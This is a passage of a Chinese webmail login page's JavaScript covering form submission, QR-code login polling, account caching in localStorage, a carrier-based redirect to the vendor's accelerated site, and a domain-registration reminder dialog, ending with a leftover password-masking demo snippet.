                            WJF.util.setItem(WJF.constants.SAVE_ACCOUNT_KEY, data.account, {
                                error: function (e) {
                                    if (e.name == 'QuotaExceededError') {
                                        WJF.util.log(I18NMessage.common.STORE_EXCESS_CLEAR_CURRENT);
                                        window.localStorage.clear();
                                    } else {
                                        console.error(e.message);
                                        console.error(e);
                                    }
                                    return false;
                                }
                            });
                            // 用户锁屏判断
                            WJF.util.setItem('justLoggedIn', 'true');
                            window.location.href = data.version == '2' ? "/v2/site/index" : '/site/index'
                        }
                    }, {
                        failure: function (data) {
                            WJF.ui.alert.warn(data.error);
                            clearInterval(this.checkLoginIntervalHandle);
                        }
                    });
                }, 3000);
            });
        },
        /**
         * 执行登陆操作
         */
        handleLogin: function (formData, opts) {
            WJF.util.getBrowserFingerprint(function (fingerprint) {
                formData.fp = fingerprint;
                WJF.html.submitForm('/login/index', formData, opts);
                WJF.util.setItem(WJF.constants.SAVE_ACCOUNT_KEY, formData.username + '@' + formData.domain, {
                    error: function (e) {
                        if (e.name == 'QuotaExceededError') {
                            WJF.util.log(I18NMessage.common.STORE_EXCESS_CLEAR_CURRENT);
                            window.localStorage.clear();
                        } else {
                            console.error(e.message);
                            console.error(e);
                        }
                        return false;
                    }
                });
                WJF.util.setItem('justLoggedIn', 'true');
            });
        },
        regEvent: function () {
            //登录方式切换（账号密码登录/二维码登录）
            var self = this;
            $(".J_loginSwitch").on('click', function () {
                $('#J_loginBox').toggleClass('login-code-box');
                if ($('#J_loginBox').hasClass('login-code-box')) {
                    self.checkCodeLogin();
                } else {
                    self.cancelCheckCodeLogin();
                }
            });

            //管理员登录
            $('.setAdmin').on('click', function () {
                $('input[name="username"]').val('postmaster');
            });

            //密码显示与隐藏，眼睛图标
            $('.J_loginPage_eye').on('click', function () {
                $('.J_loginPage_eye').toggleClass('close');
                if ($('.J_loginPage_eye').hasClass('close')) {
                    $('input[name="password"]').attr('type', 'password');
                } else {
                    $('input[name="password"]').attr('type', 'text');
                }
            });

            // 客户端下载和二维码hover切换
            $('.tagitem').on('mouseenter', function () { // 使用 mouseenter 替代 hover（更明确）
                // 获取当前元素在兄弟中的索引（从0开始）
                var index = $(this).index();

                // 处理标签切换
                $(this).addClass('tagcur').siblings('.tagitem').removeClass('tagcur');

                // 处理内容区域切换
                var $tagcon = $('.tagcon');
                $tagcon.eq(index).removeClass('hide').addClass('show').siblings('.tagcon').removeClass('show').addClass('hide');
            });
            $('.erweima').hover(
                function () {
                    // 鼠标悬停时执行的代码
                    $(this).siblings('.popbox').show();
                },
                function () {
                    // 鼠标离开时执行的代码
                    $(this).siblings('.popbox').hide();
                }
            );
        },
        //检查ip网络
        checkIpSource: function (hostname) {
            var self = this, ischecked = false;
            var base64Encoded = btoa("domain=" + hostname);
            var urlEncoded = encodeURIComponent(base64Encoded);
            var date = new Date();
            date.setTime(date.getTime() + (90 * 24 * 60 * 60 * 1000));
            WJF.serviceManager.get('/v2/login/ip', {}, function (req) {
                var isShowCnc = (req.data.data == '联通' || req.data.data == '移动');
                if (isShowCnc) {
                    if (document.cookie.match(/GOCNCSITE=true/)) {
                        window.location.href = 'https://66.35.com/start?sign=' + urlEncoded;
                        return;
                    } else if (document.cookie.match(/GOCNCSITE=false/)) {
                        return;
                    }
                    var content = "经系统检测，您的IP为" + req.data.data + "网络，加载速度较慢，是否切换到加速线路？<br>" + '<input type="checkbox" name="isgocnc" autocomplete="off" class="m-ck" id="J_go_cnc" ><label for="J_go_cnc" class="m-ck-label">记住我的选择</label>';
                    showCncConfirmWindow = WJF.ui.alert.confirm(content, {
                        area: ['500px', 'auto'],
                        skin: 'class-layer-checkip-custom',
                        btn: [I18NMessage.common.BTN_YES, I18NMessage.common.BTN_NO],
                        yes: function (index, layero, that) {
                            ischecked = layero.find('#J_go_cnc').prop('checked');
                            if (ischecked) {
                                document.cookie = 'GOCNCSITE=true;expires=' + date.toUTCString() + ';path=/;';
                            }
                            window.location.href = 'https://66.35.com/start?sign=' + urlEncoded;
                            return true;
                        },
                        btn2: function (index, layero, that) {
                            ischecked = layero.find('#J_go_cnc').prop('checked');
                            if (ischecked) {
                                document.cookie = 'GOCNCSITE=false;expires=' + date.toUTCString() + ';path=/;';
                            }
                            return true;
                        },
                        success: function (layero, index, that) {
                            if (!document.cookie.match(/GOCNCSITE/)) {
                                ischecked = false;
                            } else if (document.cookie.match(/GOCNCSITE=true/)) {
                                ischecked = true;
                            } else if (document.cookie.match(/GOCNCSITE=false/)) {
                                ischecked = false;
                            }
                            layero.find('#J_go_cnc').prop('checked', ischecked);
                        }
                    });
                }
            })
        },
        //域名后缀是.com .cn .xyz .vip .top .net .cc 的，弹窗提醒备案
        beiAnDialog: function () {
            if (!WJF.util.getUrlParams('sign') || window.location.hostname == '66.35.com') {
                return false;
            }
            var regex = /\.(com|cn|xyz|vip|top|net|cc)$/i;
            var isValid = regex.test(DOMAIN);
            var msg = '<span style="color: red">请通知邮局管理员尽快完成域名备案，临时域名将于近期停止跳转服务，可能影响邮局的正常使用！</span><a href="https://yunyou.top/help/detail?id=132" target="_blank" class="blue-link" style="font-size: 16px">邮局如何备案</a>';
            if (isValid) {
                WJF.ui.alert.warn(msg, {
                    area: ['530px', 'auto'],
                    dangerouslyUseHTMLString: true
                });
            }
        },
        init: function () {
            this.regEvent();
            var hostname = window.location.hostname;

            if (hostname == 'www.yunyou.top' || hostname == 'yunyou.top' || hostname == 'mail.yunyou.top' || hostname == 'v6.35.com') {
                $(".J-login-content").addClass('login-content2');
            }

            var hostname = hostname.split('.');
            if (hostname.length == 2) {
                hostname = hostname.join('.');
            } else {
                hostname = hostname.splice(1).join('.');
            }
                        if (hostname == '35.com' || hostname.indexOf("cn4e.com") != -1) {
                $("#J_loginForm input[name='domain']").val();
            } else if (hostname != 'yunyou.top') {
                $("#J_loginForm input[name='domain']").val(hostname);
            }
            
            $("#J_verifyImg").on('click', function () {
                this.src = '/login/verify?t=' + (new Date()).getTime();
            });
            $('form').submit(function () {
                loginPage.doLogin(this);
                return false;
            });

            $(".J-input-filter").on('keypress', function (event) {
                if (this.name == "username") {
                    return nameStrFilter(event);
                }
                return domainStrFilter(event);
            })
            this.checkIpSource(hostname);//检查ip来源
            this.beiAnDialog();
        }
    }
    loginPage.init();

</script>



<script>
    WJF.constants.LANG = WJF.util.parseLang("zh-CN");
</script>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("J_loginPage_u_password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>